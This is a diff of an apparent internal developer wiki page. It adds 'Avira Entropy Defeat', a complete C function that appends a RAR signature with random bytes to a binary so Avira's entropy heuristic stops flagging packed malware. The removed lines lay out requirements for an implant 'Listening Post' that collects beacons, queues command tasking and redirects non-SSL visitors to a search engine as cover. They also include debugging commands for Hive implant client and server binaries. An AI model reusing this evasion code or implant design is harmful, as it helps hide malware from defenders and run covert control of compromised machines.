@@ -1,215 +1,66 @@
 
-                        Owner: User #3375130
-
-User #3375130's Home
-
-
-About Me (User #3375130)
-You may edit this page to include additional information about yourself.
-E-mail: XXXXX@devlan.net
+                        Owner: User #71473
+Avira Entropy Defeat
+Avira has an entropy-based heuristic that will flag binaries that contain large sections of compressed/encrypted data. Experimentation leads us to believe that this detection is proportional and will detect files that have ~5% or more high entropy data.
+Padding the file to reduce this proportion defeats the technique but is not ideal. Fortunately, we can achieve the same affect by adding a RARFile compression algorithm signature with a few bytes of data to the binary in an arbitrary location. For simplicity’s sake, appending to the end seems to do the trick.
+BOOL AddAviraDefeat(LPCTSTR szTargetFile)
+{
+    HCRYPTPROV hCryptProv;
+    BYTE pbData[28];
+    DWORD dwWritten, dwRead;
+    CHAR rarBuffer[32] = "Rar!";
+    CHAR tmpBuffer[32] = {0};
  
+    // check for existing defeat
+    HANDLE hFile = CreateFile(szTargetFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    if (hFile != INVALID_HANDLE_VALUE)
+    {
+        SetFilePointer(hFile, -32, NULL, FILE_END);
+        if (!ReadFile(hFile, tmpBuffer, 32, &dwRead, NULL) || dwRead != 32)
+        {
+            printf("WARNING: Couldn't read file to check for existing Avira defeat. You should manually check for the defeat at the end of the file and add if necessary -- see AviraDefeat folder on User #?'s share.\n");
+            CloseHandle(hFile);
+            return FALSE;            
+        };
  
-PLASMA NOTES
+        CloseHandle(hFile);
+        tmpBuffer[4] = '\0';
+        if (stricmp(tmpBuffer, "RAR!") == 0)
+        {
+            printf("Avira defeat already exists.");
+            return TRUE;
+        }
+    }
  
-
- Talked to Plasma Customers this week.  Mentioned that if the LP's client tries to connect via non-ssl, we should just redirect them to google.com or some other search engine appropriate for that region.
-
-LP Requirements
-No PHP on the device.
-Prefer JSONJavascript Object Model data file format.  Useful vi command for editing json files is ":%!python -m json.tool".
-
-
-
-Built a server on 2 VM's (one on my Mac Box, and one on the Tango (10.6.5.50) server that have apache running.
-
-Apache Notes:  How To Create Temporary and Permanent Redirects with Apache .pdf                         How To Set Up Apache Virtual Hosts on Ubuntu 14.pdf   
-
-Requirements:
-Shall be tested on Ubuntu 12.04 x86_64 and run on Debian Stable.
-Shall take the form of CGI, WSGI, or similar script running within the context of a standard daemon for the transport protocol (e.g., Apache, Nginx, PowerDNS).
-Shall NOT be written in PHP.
-The Listening Post shall not listen for beacons directly, instead relying on the standard daemon for transport protocol.
-The listening Post shall authenticate and validate beaconing implants.
-The listening post shall not store or retain the IP addresses of beaconing implants beyond the beacon log generation event.
-The Listening Post shall log the receipt of each beacon to syslog.
-The Listening Post shall maintain a list of Unique Implant Identifiers (built from valid received beacons), their next beacon delay times (based on user configuration or a system default), and any pending command tasking.
-The listening post shall not decrypt beacon contents.  Beacons shall instead be transferred to a high-side system for offline decryption and post processing.
-The listening post shall provide a command-line interface (CLICommand-Line Interface).
-The listening post CLICommand-Line Interface shall allow users to configure a custom minimum and maximum next-beacon delay for each implanted device.
-The listening post CLICommand-Line Interface shall allow users to select a variable next-beacon delay algorithm for each implant (for example, to avoid black out dates, or to increase the delay time between each subsequent Heartbeat beacon).
-The Listening Post CLICommand-Line Interface shall allow batch creation or editing of implant configurations and tasking of commands (i.e. via a user-provided tasking/configuration file).
-The listening Post shall report, along with the contents of each received beacon, the date and time the beacon was received by the LP, and the public source IP address of the beaconing implant.
-
-
-
-
-
-
+    if (!CryptAcquireContext(&hCryptProv, 0, 0, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT | CRYPT_SILENT))
+    {
+        printf("WARNING: Couldn't get crypto context for random data for Avira defeat. You should manually add the defeat -- see AviraDefeat folder on User #?'s share.\n");
+        return FALSE;
+    }
  
+    if(!CryptGenRandom(hCryptProv, 28, pbData))
+    {
+        printf("WARNING: Couldn't generate random data for Avira defeat. You should manually add the defeat -- see AviraDefeat folder on User #?'s share.\n");
+        CryptReleaseContext(hCryptProv, 0);
+        return FALSE;
+    }
  
+    CryptReleaseContext(hCryptProv, 0);
  
+    memcpy(rarBuffer + 4, pbData, 28);
  
-Hive Client Debugging Commands (Make sure iptables is not blocking any ports and target is listening on port specified for raw-tcp and raw-udp triggers...):
-Client: gdb --args ./hclient-linux-x86-dbg ./coreClient -a 10.3.2.188 -t 10.3.2.188 -P raw-tcp -r 22 -k TestingTesting -p 4001 -m b
-Hived: gdb --args ./hived-linux-x86-dbg ./coreHived -t 0 -a 10.2.5.191 -i 600 -d 10 -k TestingTesting
-Linux/Unix Topics
-info (Use "info info" command)
-udev (Implementation may vary between distributions)
-CentOs/Redhat
-Rules for writing udev assignment rules: index.html
-
-Configuration file = /etc/udev/udev.conf
-Other directories = /usr/lib/udev, /dev/.udev, /etc/udev/rules.
-MRR Notes: 
-
-Even after you modify the rules in /etc/udev/rules.d, these changes seem to have no effect until the system is rebooted.
-Command "udevadm monitor" is very useful for determining which device is being added/removed from the system.
-
+    hFile = CreateFile(szTargetFile, GENERIC_READ|FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    if (hFile != INVALID_HANDLE_VALUE)
+    {
+        if (!WriteFile(hFile, rarBuffer, 32, &dwWritten, NULL) || dwWritten != 32)
+        {
+            printf("WARNING: Couldn't add Avira defeat. You should manually add the defeat -- see AviraDefeat folder on User #?'s share.\n");
+            CloseHandle(hFile);
+            return FALSE;
+        }
+    }
  
-How to determine whether a static library is a 64-bit or 32-bit compiled library
-Command:        objdump -f <library.a> | grep ^architecture       
-Where <library.a> is the file name of the library in question (i.e. /usr/local/mpop/lib/libmpop_mb.a)
-32-bit libraries yield lines similar to the following:
-architecture:  i386, flags 0x00000011:
-64-bit libraries yield lines similar to the following:
-architecture:  i386:x86-64, flags 0x00000011:
- 
-Roundabout (RAB)
-Creating a 32 bit virtual machine to compile and run RAB:
-
- Downloaded CentOS-6.2 32_bit version of LiveCD
-
- Created ssh keys using "ssh-keygen -t rsa" command for User #72220.
-
- Created "/etc/yum.repos.d/devlan.repo" file to pull from our repository.
-
- Added some package installs:
-yum install gcc gcc-c++
-yum install make
-yum install openssh-server
-yum install git-all
-
-
-
-Got RAB repository:
-Set ssh keys.
-mkdir code
-cd code
-git clone ssh://git@stash.devlan.net:7999/rab/roundabout.git
-
-
-
-Changed display to 1920x1200 resolution.
-
-Created /home/User #72220/RAB_External_sources folder to store additional packages required for new virtual machine.
-
-
-Install Java 1.7.0 
-
-
-yum install java-1.7.0-openjdk-devel
-
-Downloaded Java Unlimited Encryption Policy "UnlimitedJCEPolicyJDK7.zip" file to "/home/User #72220/RAB_External_sources" folder.
-cd /home/User #72220/RAB_External_sources
-unzip UnlimitedJCEPolicyJDK7.zip
-cd UnlimitedJCEPolicy
-Verified it contained to files "local_policy.jar" and "US_export_policy.jar" and one "README.txt" file
-
-
-
-  Replace "local_policy.jar" and "US_export_policy.jar" in /usr/lib/jvm/jre/lib/security folder with the new ones downloaded in previous step.
-cd /usr/lib/jvm/jre/lib/security
-mkdir original_Limited_Encryption
-cp ./*.jar ./original_Limited_Encryption
-cp /home/User #72220/RAB_External_sources/UnlimitedJCEPolicy/*.jar .
-
-
-
-  Verified RAB 1.4.2 Java app runs in this CentOS 6.2 32-bit machine
-Copied "Amber_v1.4.2_RC01_lib" folder and "Amber_v1.4.2_RC01.jar" file to /home/User #72220/Desktop directory.
-cd /home/User #72220 Desktop
-java -jar ./Amber_v1.4.2_RC01.jar
-Click on the Roundabout Java Window that pops up and select the "Task->Encryption Check" menu option.
-
-Verify that a Dialog box reading "Unlimited encryption is available" with an "OK" radio button.  If it does, you have a Java build that may be used to process RAB tasking and collected results files.Anything else and an error has occurred. 
-
-
-
-
-Install Google's protocol buffers
-
-Copied "protobuf-2.6.1.tar.gz" to the "/home/User #72220/RAB_External_sources" folder.
-cd /home/User #72220/RAB_External_sources
-tar -xvzf protobuf-2.6.1.tar.gz
-cd protobuf-2.6.1
-./configure
-make
-make check       (Verified no failures).
-make install
-
-
-Install eclipse packages
-
-Copied the "eclipse-cpp-mars-R-linux-gtk.tar.gz" and "eclipse-java-mars-R-linux-gtk.tar.gz" files to the "/home/User #72220/RAB_External_sources" folder
-cd /home/User #72220/RAB_External_sources
-tar -xvzf eclipse-cpp-mars-R-linux-gtk.tar.gz
-cd eclipse
-
- 
- 
-
-
-
-
-('recently-updated' missing)
-
-
-Navigate space
-
-('pagetreesearch' missing)
-
-('pagetree' missing)
-
-
- 
-
-
-Attachments:
-
-
-How To Set Up Apache Virtual Hosts on Ubuntu 14.pdf
-
-
-How To Create Temporary and Permanent Redirects with Apache .pdf
-
-
-index.html
-
-
-
-Sub-Pages:
-
-
-SOLDER 
-
-
-
-Previous versions:
-| 1 
-| 2 
-| 3 
-| 4 
-| 5 
-| 6 
-| 7 
-| 8 
-| 9 
-| 10 
-| 11 
-| 12 
-| 13 
-| 14 
-| 15 
-| 16 
-|
+    CloseHandle(hFile);
+    return TRUE;
+}
                     
